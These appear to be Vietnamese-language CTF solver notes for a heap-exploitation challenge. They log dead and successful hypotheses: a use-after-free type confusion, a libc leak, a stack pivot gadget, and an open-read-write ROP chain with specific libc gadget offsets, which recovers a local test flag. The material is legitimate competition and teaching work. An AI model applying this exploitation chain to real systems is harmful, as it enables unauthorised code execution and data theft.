# notes.md - ccu-banking-terminal-premium-2

Input: `C:/Users/Administrator/Downloads/ccu-premium-terminal.zip` (1127978 B,
sha256 `2e3e1d6f99afd93227d625cd55bc90a89d575d61e5af18ef49f2259d7c2529e8`)
Định dạng cờ đề yêu cầu: `cdctf{...}`

## H1 - Format string trong show_summary
cmd: `objdump -d ccu_premium | grep -A 150 "<show_summary>:"` rồi gửi payload
`b"%55$llx" + b"\x00"*350` làm branch page qua menu 5, trigger bằng menu 1
evidence: `401ec4: call 4010e0 <printf@plt>` với format load từ `4036f8`
(`PROJECTED PERIOD DIVIDEND : %.2f`), tức constant trong `.rodata`; không có `call printf`
nào nhận data của trang làm argument đầu
result: DEAD - binary không có format-string primitive. Mọi kết quả suy ra "%55$llx leak"
là kỳ vọng, không phải output quan sát được.

## H2 - Đoán bảng seccomp, lên kế hoạch mmap RWX + shellcode
cmd: đọc dữ liệu gần jump table, tự liệt kê `9,15,16,21,23,25,32,37,38,42`
evidence: `dd if=ccu_premium bs=1 skip=16736 count=44 | xxd` (file offset `0x4160` =
vaddr `0x404160`, vì `.text` có vaddr - file off = `0x400000`) cho đúng 11 dword:
`0,1,2,0x101,8,5,0xc,9,0xb,0x3c,0xe7` = `read, write, open, openat, lseek, fstat, brk,
mmap, munmap, exit, exit_group`
result: DEAD - không có `mprotect` (10) nên không thể chuyển page sang RWX; và
`seccomp_init(0x80000000)` = default KILL. Chỉ orw là khả thi.

## H3 - Dán Python thẳng vào bash / recvuntil sai prompt
cmd: paste script Python vào shell workstation
evidence: `bash: from: command not found`, `syntax error near unexpected token '('`;
khi đã có file thì `io.recvuntil(b"Access PIN: ")` raise `EOFError` vì server trả
`Access PIN    : ` (nhiều khoảng trắng) và prompt menu là `Selection: ` chứ không phải `> `;
`default.timeout` -> `NameError`, `context.default.timeout` -> `AttributeError`
result: DEAD (tooling) - phải tạo file bằng heredoc `cat > x.py << 'EOF'`, dùng
`context.timeout`, và wait theo chuỗi con thay vì prompt đầy đủ.

## H4 - Đè `+0x28` trực tiếp trong branch page của record
cmd: gửi 384 byte có `p64(0x401070)` và `p64(0xdeadbeefcafe0000)` đặt tại `0x28`, `0xa8`,
`0x100`, `0x128`, `0x150` cho menu 5, rồi menu 1
evidence: `open_account` @0x40210b về sau ghi đè `+0x00` = `next_number`, `+0x04` =
`type-1`, `+0x08` = balance đã scale, và (theo lần chạy local) `+0x28` =
`RATE_TABLE[type-1]`, `+0x27` = 0; không có crash nào từ các giá trị ta đặt
result: DEAD - trang của record không thể giữ callback do ta chọn. Trang của memo thì giữ,
vì `attach_memo` không fixup field nào.

## H5 - UAF: memo tái sử dụng chunk record đã free
cmd: `objdump -d` các hàm `open_account`, `close_account`, `attach_memo`; rồi mở 9 record,
đóng 1..9, attach memo
evidence: `close_account` gọi `free(accounts[i-1])`, đặt `closed[i]=1`, không xoá con trỏ,
không giảm `n_accounts`; `attach_memo` cũng `malloc(0x180)` + `read_full(memo,0x180)`;
`show_summary` lặp cả record closed và thực hiện
`401e9b: mov 0x28(%rax),%rdx` / `401ea3: mov %rax,%rdi` / `401ea6: call *%rdx`
result: OK - type confusion, toàn quyền `+0x28`, và `rdi = rec` khi gọi.

## H6 - Leak libc qua money(rec, 0x30, rec+0x08)
cmd: 9 x (menu 2, type 1, balance 0, trang trắng) rồi 9 x (menu 3, số hiệu i), rồi menu 1
evidence: mở 9 chunk 0x180 rồi free theo thứ tự -> 7 chunk vào tcache, 2 chunk kế tiếp
xuống unsorted bin; `money()` in `rec+0x08` ra thập phân 64-bit. Lần chạy local in
`[+] logged in / [+] 9 records opened / [+] 9 records closed / [*] libc base = 0x793845b9f000`
và `analysis/local_run_output.bin` còn dòng dò `leak 0x52a9a0bce3e25fc4` (tcache key,
bị loại bởi bộ lọc canonical)
result: OK - delta `LIBC_BINS0 = 0x21ACE0` calibrate trong lab; bộ lọc
`v>>47==0 and (v-0x21ace0)%0x1000==0` giữ đúng unsorted-bin bk.

## H7 - Pivot stack lên chunk
cmd: `dd if=ccu_premium bs=1 skip=4969 count=8 | xxd` (vaddr `0x401369`)
evidence: `4889 fcc3` = `mov rsp,rdi ; ret`; binary không có `pop rdi` và không có
instruction `syscall` nào
result: OK - `PIVOT = 0x401369` đặt tại `+0x28`, sau `mov rsp,rdi; ret` thì
`rsp == rec`, trang 384 byte thành stack ROP, không cần leak heap.

## H8 - ROP orw trong libc
cmd: `python exploit.py` chống lab local (`analysis/service.py`)
evidence: gadget `POP_RDI 0x2A3E5`, `POP_RSI 0x2BE51`, `POP_RAX 0x45EB0`,
`POP_RDX 0x90469` (`pop rdx;pop rbx;ret`; `pop rdx;ret` không tồn tại), `OPEN 0x114630`,
PLT `read 0x401150 / write 0x4010a0 / exit 0x401070`; scratch `0x406300`, `0x406340`
(trang RW cuối binary, `.bss` kết thúc `0x406288`). Output đọc về chứa
`/flag\x00\x00\x00cdctf{LOCAL_TEST_FLAG_abc123}\n`
result: OK 5/5 lần - chuỗi orw chạy đúng trên local. Slot `+0x28` phải bị tiêu bởi
`pop rax;ret` (đặt `pop rsi;ret` ở đó làm hỏng tham số buffer của `read()`).

## H9 - Cờ thật trên instance
cmd: (chưa chạy trong phiên này; các lệnh đã gửi từ workstation chỉ tới bước login/menu và
dừng ở EOFError/tooling)
evidence: `analysis/flagfile.local` = `cdctf{LOCAL_FAKE_FLAG_not_real}` là flag tự dựng
result: PENDING - bài ở `_wip/` cho tới khi `python solve.py` trên instance in ra
`cdctf{...}` thật và lưu vào `flag.txt`.

## Ghi chú môi trường (ràng buộc phải nhớ)
- Workstation của đề **không có internet**: không `pip install`, không tải gì; phải
  `cat > solve.py`, paste, Ctrl-D.
- Không được stub `libseccomp`: nó malloc khi dựng filter, bỏ nó thì heap dời và kết quả
  local lệch server.
- Bài này là bài mà hạ tầng CDCTF đã forensic-attribute traffic agent (qodercli) hôm
  2026-10-04. Chứng minh chỉ làm ở lab local; packet tới instance do người chạy.

---

Nguyên tắc ghi: không xoá nhánh sai, chỉ thêm `result: DEAD - <lý do>`, để lần sau đọc lại không thử trùng.
